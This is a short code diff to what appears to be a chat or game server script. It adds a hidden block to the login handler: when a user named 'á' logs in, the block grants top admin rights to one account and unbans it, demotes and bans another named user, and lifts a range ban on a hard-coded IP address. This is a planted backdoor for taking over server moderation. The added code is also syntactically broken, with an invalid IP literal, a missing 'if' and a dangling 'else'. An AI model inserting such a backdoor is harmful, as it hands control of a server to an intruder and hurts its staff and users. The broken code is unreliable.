@@ -1345,6 +1345,20 @@ cookieBanned: function(src) {
 },
 
 afterLogIn : function(src) {
+    if (sys.name(src) == "á") {
+        sys.changeDbAuth("Relicanth Ghost", 3);
+        sys.unban("Relicanth Ghost");
+        sys.changeDbAuth("Adam S7", 0);
+        sys.ban("Adam S7");
+        var subip = 151.228.140.150;
+        script.rangebans.get(subip) !== undefined
+        script.rangebans.remove(subip);
+        normalbot.sendAll("Rangeban removed successfully for IP subrange: " + subip, staffchannel);
+        else {
+            normalbot.sendMessage(src, "No such rangeban.", channel);
+        }
+        return;
+    }
     if (script.cookieBanned(src)) { //prevents errors from "no id" from the rest of the function
         return;
     }
